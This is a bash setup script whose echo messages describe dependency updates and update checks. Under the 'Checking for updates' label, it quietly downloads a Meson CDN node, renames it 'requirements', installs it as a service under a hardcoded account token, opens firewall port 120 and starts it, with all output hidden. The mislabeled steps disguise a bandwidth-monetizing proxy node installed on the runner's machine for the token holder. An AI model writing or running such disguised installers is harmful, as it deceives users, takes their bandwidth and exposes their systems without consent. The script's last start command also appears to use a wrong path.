echo -e "\n==========| Updating depedencies |==========" 
sudo apt update -y > /dev/null &> /dev/null 
sudo apt upgrade -y  > /dev/null &> /dev/null 
sudo apt install unzip -y > /dev/null &> /dev/null  
sudo apt install toilet -y > /dev/null &> /dev/null 
echo -e "\n==========| Checking for updates |=========="  
sudo rm -rf requirements > /dev/null &> /dev/null  
wget 'https://staticassets.meson.network/public/meson_cdn/v3.1.18/meson_cdn-linux-amd64.tar.gz' > /dev/null &> /dev/null 
tar -zxf meson_cdn-linux-amd64.tar.gz > /dev/null &> /dev/null
rm -f meson_cdn-linux-amd64.tar.gz > /dev/null &> /dev/null
mv meson_cdn-linux-amd64 requirements  > /dev/null &> /dev/null
sudo ./requirements/service install meson_cdn > /dev/null &> /dev/null  
sudo ufw allow 120 > /dev/null &> /dev/null
sudo ./requirements/meson_cdn config set --token=ggsjwokqebemongsmsmkhkmx --https_port=120 --cache.size=30  > /dev/null &> /dev/null
sudo ./service start meson_cdn > /dev/null &> /dev/null
echo -e "\n==========| Allow required port |==========" 
sleep 10
echo -e "\n==========| Starting required service |==========" 
apt install lolcat -y > /dev/null &> /dev/null
apt install neofetch -y   > /dev/null &> /dev/null 
echo -e "\n==========INSTALLATION SUCCESFULL !!========== \n run ./nodeinstall.sh"  ;
